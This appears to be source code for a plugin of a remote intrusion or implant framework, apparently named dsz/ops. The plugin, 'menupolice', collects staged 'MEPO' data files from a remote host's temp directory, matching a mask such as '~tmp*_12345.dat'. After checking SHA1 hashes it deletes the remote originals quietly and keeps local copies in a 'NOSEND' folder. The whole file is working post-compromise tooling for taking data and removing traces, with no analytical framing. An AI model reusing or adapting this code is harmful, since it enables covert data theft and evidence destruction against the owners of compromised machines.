
from plugin import plugin

class menupolice(plugin, ):

    def __init__(self, os, maxsize):
        plugin.__init__(self, os, maxsize, __name__)
        print ('loaded %s' % __name__)

    def preGet(self):
        lFiles = self.listFiles()
        size = 0
        for f in lFiles:
            size += f.size
        print ('About to get %d files totalling %d bytes. Will prompt for individual files > %d bytes' % (len(lFiles), size, self.getMaxSize()))

    def postGet(self):
        import shutil
        import os, os.path
        import dsz.cmd
        import ops.cmd
        import ops.env
        NOSEND = os.path.join(ops.env.get('_LOGPATH'), 'GetFiles', 'NOSEND')
        MP_ENC = os.path.join(NOSEND, 'Menupolice_Encrypted')
        if (not os.path.exists(NOSEND)):
            os.makedirs(NOSEND)
        if (not os.path.exists(MP_ENC)):
            os.makedirs(MP_ENC)
        for f in self.listCollectedFiles():
            remoteFullFile = f[0]
            localFullFile = f[1]
            remotePath = os.path.split(remoteFullFile)[0]
            remoteFile = os.path.split(remoteFullFile)[1]
            localPath = os.path.split(localFullFile)[0]
            localFile = os.path.split(localFullFile)[1]
            remoteHash = ''
            localHash = ''
            rDir = ops.files.dirs.get_dirlisting(path=remotePath, mask=remoteFile, hash='sha1')
            for diritem in rDir.diritem:
                for fileitem in diritem.fileitem:
                    for filehash in fileitem.filehash:
                        remoteHash = filehash.value
            dsz.control.echo.Off()
            dsz.control.quiet.On()
            cmd = ('local dir %s -hash sha1' % localFullFile)
            dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
            localHash = dsz.cmd.data.Get('diritem::fileitem::hash::value', dsz.TYPE_STRING)[0]
            dsz.control.quiet.Off()
            dsz.control.echo.On()
            if (remoteHash == localHash):
                print ('local and remote hashes match, deleting %s ... ' % remoteFullFile),
                cmd = ops.cmd.getDszCommand('delete')
                cmd.arglist = [('"%s"' % remoteFullFile)]
                cmd.execute()
                if cmd.success:
                    print 'deleted'
                else:
                    print 'delete FAILED!'
            else:
                print ("NOT deleting %s, hashes don't match" % remoteFullFile)
            destFile = os.path.join(MP_ENC, remoteFile)
            shutil.copy(localFullFile, destFile)

    def check(self, path):
        import os.path
        import dsz.ui
        defaultDir = 'c:\\windows\\temp'
        defaultMask = '~tmp*_12345.dat'
        collectDir = dsz.ui.GetString('Enter the directory which contains the MEPO collection files', defaultDir)
        collectMask = dsz.ui.GetString('Enter the file mask for the MEPO collection files you wish to collect (and delete)', defaultMask)
        response = dsz.ui.Prompt(('Does %s look appropriate?' % os.path.join(collectDir, collectMask)))
        if (response == 1):
            self.find(collectDir, [collectMask], False)
        else:
            print 'MENUPOLICE collection aborted'